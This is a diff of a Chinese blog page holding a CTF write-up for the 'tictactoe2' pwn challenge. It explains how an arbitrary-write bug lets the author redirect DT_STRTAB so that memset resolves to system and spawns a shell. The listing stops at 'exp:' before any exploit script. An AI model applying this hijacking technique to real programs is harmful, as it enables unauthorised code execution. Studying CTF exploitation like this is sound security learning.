@@ -1,1010 +1,595 @@
 <!DOCTYPE html>
+<html lang="zh-Hans">
 
 
 
 
 
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
-
-<link rel="stylesheet" href="/css/main.css?v=7.1.0">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.1.0',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="description" content="zs0zrc&#39;s blog">
+  <meta name="author" content="zs0zrc">
+  <meta name="keywords" content="pwn CTF security anythings">
+  <title>tictactoe2 writeup - zs0zrc</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
 
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-  <meta name="description" content="防护机制： 123456[*] &amp;apos;/home/zs0zrc/pwn/Scoreboard/tictactoe/tictactoe&amp;apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE">
-<meta name="keywords" content="writeup,pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="tictactoe2 writeup">
-<meta property="og:url" content="http://yoursite.com/2018/09/24/2018-9-24-tictactoe2-writeup/index.html">
-<meta property="og:site_name" content="zs0zrc">
-<meta property="og:description" content="防护机制： 123456[*] &amp;apos;/home/zs0zrc/pwn/Scoreboard/tictactoe/tictactoe&amp;apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/picture/1537788594531.png">
-<meta property="og:image" content="http://yoursite.com/picture/1537789136592.png">
-<meta property="og:updated_time" content="2019-01-02T08:13:28.061Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="tictactoe2 writeup">
-<meta name="twitter:description" content="防护机制： 123456[*] &amp;apos;/home/zs0zrc/pwn/Scoreboard/tictactoe/tictactoe&amp;apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE">
-<meta name="twitter:image" content="http://yoursite.com/picture/1537788594531.png">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
 
 
+<!-- 自定义样式保持在最底部 -->
 
-
-
-  
-  
-  <link rel="canonical" href="http://yoursite.com/2018/09/24/2018-9-24-tictactoe2-writeup/">
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>tictactoe2 writeup | zs0zrc</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
 </head>
 
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
-  
-  
-    
-  
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>zs0zrc</strong>&nbsp;</a>
 
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">zs0zrc</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
     </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-categories">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-
-  
 </nav>
 
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-  
-  
-
-  
-
-  <a href="https://github.com/zszcr" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
-
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-            
-
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/24/2018-9-24-tictactoe2-writeup/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="zs0zrc">
-      <meta itemprop="description" content="zs0zrc's blog">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zs0zrc">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">tictactoe2 writeup
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-09-24 20:28:43" itemprop="dateCreated datePublished" datetime="2018-09-24T20:28:43+08:00">2018-09-24</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-01-02 16:13:28" itemprop="dateModified" datetime="2019-01-02T16:13:28+08:00">2019-01-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/hackme-inndy-writeup/" itemprop="url" rel="index"><span itemprop="name">hackme.inndy_writeup</span></a></span>
-
-                
-                
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
               
             </span>
-          
 
-          
             
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Monday, September 24th 2018, 8:28 pm
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      5 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
             
-          
+          </div>
 
           
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
-      
-        <p>防护机制：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/zs0zrc/pwn/Scoreboard/tictactoe/tictactoe&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-<p>这题文件和tictactoe1是一样的，只不过这个要求getshell，漏洞点也就是一个任意地址写，我对着分析了半天除了想到将n修改成0，使得可以进行9次任意地址写 ，就想不到什么了，看了大佬的writeup才发现是用 ret2_dl_runtime_resolve做的</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span> &amp;&amp; !sub_80487F6(); ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">if</span> ( n == <span class="number">-1</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     sub_80489C0();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     sub_8048762();</span><br><span class="line">     sub_8048A4B();</span><br><span class="line">   &#125;</span><br><span class="line">   n = -n;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>防护机制：</p>
+<pre><code>[*] &#39;/home/zs0zrc/pwn/Scoreboard/tictactoe/tictactoe&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre><p>这题文件和tictactoe1是一样的，只不过这个要求getshell，漏洞点也就是一个任意地址写，我对着分析了半天除了想到将n修改成0，使得可以进行9次任意地址写 ，就想不到什么了，看了大佬的writeup才发现是用 ret2_dl_runtime_resolve做的</p>
+<pre><code class="c"> for ( i = 0; i &lt;= 8 &amp;&amp; !sub_80487F6(); ++i )
+  {
+    if ( n == -1 )
+    {
+      sub_80489C0();
+    }
+    else
+    {
+      sub_8048762();
+      sub_8048A4B();
+    }
+    n = -n;
+  }
+</code></pre>
 <p>elf文件各个节的信息：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">0804</span>AF14 stru_804AF14    Elf32_Dyn &lt;<span class="number">1</span>, &lt;<span class="number">1</span>&gt;&gt;      ; DATA XREF: LOAD:<span class="number">080480B</span>C↑o</span><br><span class="line">LOAD:<span class="number">0804</span>AF14                                         ; .got.plt:<span class="number">0804B</span>000↓o</span><br><span class="line">LOAD:<span class="number">0804</span>AF14                                         ; DT_NEEDED libc.so<span class="number">.6</span></span><br><span class="line">LOAD:<span class="number">0804</span>AF1C                 Elf32_Dyn &lt;<span class="number">0</span>Ch, &lt;<span class="number">8048498</span>h&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:<span class="number">0804</span>AF24                 Elf32_Dyn &lt;<span class="number">0</span>Dh, &lt;<span class="number">8048</span>DA4h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:<span class="number">0804</span>AF2C                 Elf32_Dyn &lt;<span class="number">19</span>h, &lt;<span class="number">804</span>AF04h&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:<span class="number">0804</span>AF34                 Elf32_Dyn &lt;<span class="number">1B</span>h, &lt;<span class="number">8</span>&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:<span class="number">0804</span>AF3C                 Elf32_Dyn &lt;<span class="number">1</span>Ah, &lt;<span class="number">804</span>AF0Ch&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:<span class="number">0804</span>AF44                 Elf32_Dyn &lt;<span class="number">1</span>Ch, &lt;<span class="number">4</span>&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:<span class="number">0804</span>AF4C                 Elf32_Dyn &lt;<span class="number">6F</span>FFFEF5h, &lt;<span class="number">80481</span>ACh&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:<span class="number">0804</span>AF54                 Elf32_Dyn &lt;<span class="number">5</span>, &lt;<span class="number">80482F</span>8h&gt;&gt; ; DT_STRTAB<span class="comment">//要修改的地方</span></span><br><span class="line">LOAD:<span class="number">0804</span>AF5C                 Elf32_Dyn &lt;<span class="number">6</span>, &lt;<span class="number">80481</span>D8h&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:<span class="number">0804</span>AF64                 Elf32_Dyn &lt;<span class="number">0</span>Ah, &lt;<span class="number">0B</span>Ch&gt;&gt; ; DT_STRSZ</span><br><span class="line">LOAD:<span class="number">0804</span>AF6C                 Elf32_Dyn &lt;<span class="number">0B</span>h, &lt;<span class="number">10</span>h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:<span class="number">0804</span>AF74                 Elf32_Dyn &lt;<span class="number">15</span>h, &lt;<span class="number">0</span>&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:<span class="number">0804</span>AF7C                 Elf32_Dyn &lt;<span class="number">3</span>, &lt;<span class="number">804B</span>000h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:<span class="number">0804</span>AF84                 Elf32_Dyn &lt;<span class="number">2</span>, &lt;<span class="number">68</span>h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:<span class="number">0804</span>AF8C                 Elf32_Dyn &lt;<span class="number">14</span>h, &lt;<span class="number">11</span>h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:<span class="number">0804</span>AF94                 Elf32_Dyn &lt;<span class="number">17</span>h, &lt;<span class="number">8048430</span>h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:<span class="number">0804</span>AF9C                 Elf32_Dyn &lt;<span class="number">11</span>h, &lt;<span class="number">8048418</span>h&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:<span class="number">0804</span>AFA4                 Elf32_Dyn &lt;<span class="number">12</span>h, &lt;<span class="number">18</span>h&gt;&gt;  ; DT_RELSZ</span><br><span class="line">LOAD:<span class="number">0804</span>AFAC                 Elf32_Dyn &lt;<span class="number">13</span>h, &lt;<span class="number">8</span>&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:<span class="number">0804</span>AFB4                 Elf32_Dyn &lt;<span class="number">6F</span>FFFFFEh, &lt;<span class="number">80483</span>D8h&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:<span class="number">0804</span>AFBC                 Elf32_Dyn &lt;<span class="number">6F</span>FFFFFFh, &lt;<span class="number">1</span>&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:<span class="number">0804</span>AFC4                 Elf32_Dyn &lt;<span class="number">6F</span>FFFFF0h, &lt;<span class="number">80483B</span>4h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:<span class="number">0804</span>AFCC                 Elf32_Dyn &lt;<span class="number">0</span>&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure>
+<pre><code class="c">LOAD:0804AF14 stru_804AF14    Elf32_Dyn &lt;1, &lt;1&gt;&gt;      ; DATA XREF: LOAD:080480BC↑o
+LOAD:0804AF14                                         ; .got.plt:0804B000↓o
+LOAD:0804AF14                                         ; DT_NEEDED libc.so.6
+LOAD:0804AF1C                 Elf32_Dyn &lt;0Ch, &lt;8048498h&gt;&gt; ; DT_INIT
+LOAD:0804AF24                 Elf32_Dyn &lt;0Dh, &lt;8048DA4h&gt;&gt; ; DT_FINI
+LOAD:0804AF2C                 Elf32_Dyn &lt;19h, &lt;804AF04h&gt;&gt; ; DT_INIT_ARRAY
+LOAD:0804AF34                 Elf32_Dyn &lt;1Bh, &lt;8&gt;&gt;    ; DT_INIT_ARRAYSZ
+LOAD:0804AF3C                 Elf32_Dyn &lt;1Ah, &lt;804AF0Ch&gt;&gt; ; DT_FINI_ARRAY
+LOAD:0804AF44                 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;    ; DT_FINI_ARRAYSZ
+LOAD:0804AF4C                 Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASH
+LOAD:0804AF54                 Elf32_Dyn &lt;5, &lt;80482F8h&gt;&gt; ; DT_STRTAB//要修改的地方
+LOAD:0804AF5C                 Elf32_Dyn &lt;6, &lt;80481D8h&gt;&gt; ; DT_SYMTAB
+LOAD:0804AF64                 Elf32_Dyn &lt;0Ah, &lt;0BCh&gt;&gt; ; DT_STRSZ
+LOAD:0804AF6C                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT
+LOAD:0804AF74                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG
+LOAD:0804AF7C                 Elf32_Dyn &lt;3, &lt;804B000h&gt;&gt; ; DT_PLTGOT
+LOAD:0804AF84                 Elf32_Dyn &lt;2, &lt;68h&gt;&gt;    ; DT_PLTRELSZ
+LOAD:0804AF8C                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL
+LOAD:0804AF94                 Elf32_Dyn &lt;17h, &lt;8048430h&gt;&gt; ; DT_JMPREL
+LOAD:0804AF9C                 Elf32_Dyn &lt;11h, &lt;8048418h&gt;&gt; ; DT_REL
+LOAD:0804AFA4                 Elf32_Dyn &lt;12h, &lt;18h&gt;&gt;  ; DT_RELSZ
+LOAD:0804AFAC                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT
+LOAD:0804AFB4                 Elf32_Dyn &lt;6FFFFFFEh, &lt;80483D8h&gt;&gt; ; DT_VERNEED
+LOAD:0804AFBC                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM
+LOAD:0804AFC4                 Elf32_Dyn &lt;6FFFFFF0h, &lt;80483B4h&gt;&gt; ; DT_VERSYM
+LOAD:0804AFCC                 Elf32_Dyn &lt;0&gt;           ; DT_NULL
+</code></pre>
 <p>先简单回顾下_dl_fixup的流程</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">根据rel_offset 得到函数reloc结构体在JMPREL中的位置</span><br><span class="line">根据reloc结构体中的r_offset 得到函数在got表中的地址</span><br><span class="line">根据reloc结构体中的r_info&gt;&gt;8得到函数的sym结构体在symtab中的位置</span><br><span class="line">根据sym结构中的st.name 得到函数字符串在strtab表中的位置</span><br><span class="line">最后根据得到的函数名称解析函数地址，将函数地址写入got表</span><br></pre></td></tr></table></figure>
-<p>在这里因为有任意地址写漏洞，并且存储着DT_STRTAB等节地址的地方是可以写的</p>
-<p><img src="/picture/1537788594531.png" alt="1537788594531"></p>
+<pre><code>根据rel_offset 得到函数reloc结构体在JMPREL中的位置
+根据reloc结构体中的r_offset 得到函数在got表中的地址
+根据reloc结构体中的r_info&gt;&gt;8得到函数的sym结构体在symtab中的位置
+根据sym结构中的st.name 得到函数字符串在strtab表中的位置
+最后根据得到的函数名称解析函数地址，将函数地址写入got表
+</code></pre><p>在这里因为有任意地址写漏洞，并且存储着DT_STRTAB等节地址的地方是可以写的</p>
+<p><img src="/picture/1537788594531.png" srcset="/img/loading.gif" alt="1537788594531"></p>
 <p>所以可以修改DT_STRTAB。因为程序最后会执行memset函数，所以选择修改DT_STRTAB，使得在memset在调用_dl_fixup函数时查找函数名字符串时获得的字符串是”system“，最终解析出system函数，并且向n写入’sh\x00’，那么最后执行memset时就会执行system(‘sh\x00’)</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;n, <span class="number">0</span>, <span class="number">0x18</span>u);</span><br></pre></td></tr></table></figure>
+<pre><code class="c">memset(&amp;n, 0, 0x18u);
+</code></pre>
 <p>memset函数的字符串在DT_STRTAB中的偏移为 68</p>
-<p><img src="/picture/1537789136592.png" alt="1537789136592"></p>
+<p><img src="/picture/1537789136592.png" srcset="/img/loading.gif" alt="1537789136592"></p>
 <p>system函数的字符串的地址 —&gt;[0x804900c]    target = 0x8049fc8</p>
 <p>将DT_STRTAB修改为 target= system_add - 68，这样的话当memset函数去DT_STRTAB中查找字符串时就会得到”system”字符串</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span> &amp;&amp; !sub_80487F6(); ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">if</span> ( n == <span class="number">-1</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     sub_80489C0();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     sub_8048762();</span><br><span class="line">     sub_8048A4B();</span><br><span class="line">   &#125;</span><br><span class="line">   n = -n;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c"> for ( i = 0; i &lt;= 8 &amp;&amp; !sub_80487F6(); ++i )
+  {
+    if ( n == -1 )
+    {
+      sub_80489C0();
+    }
+    else
+    {
+      sub_8048762();
+      sub_8048A4B();
+    }
+    n = -n;
+  }
+</code></pre>
 <p>不过这里还要注意的是往n写入sh字符串时，这里会每次都会取反，所以在 i 等于奇数的时候写入sh字符串，最后在内存中的就是输入的sh字符串了。</p>
 <p>exp:</p>
